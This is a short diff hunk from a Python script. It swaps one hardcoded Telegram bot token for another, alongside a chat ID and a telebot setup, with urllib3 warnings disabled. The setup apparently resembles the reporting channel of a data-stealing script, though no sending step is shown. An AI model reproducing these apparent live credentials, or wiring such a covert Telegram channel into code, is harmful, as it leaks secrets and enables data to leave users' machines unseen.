@@ -61,7 +61,7 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 # Your code continues...
 disable_warnings_urllib3()
 
-ghostly = "7134012656:AAFPg1AXnCBiY4T0fJMcfPOEEAe7fPMruvU"
+ghostly = "7183725920:AAFlsGdKZDg9tV3nVZpfg7riyN_glFv8ZEA"
 chatyd = "6764044761"
 bot = telebot.TeleBot(ghostly)
 
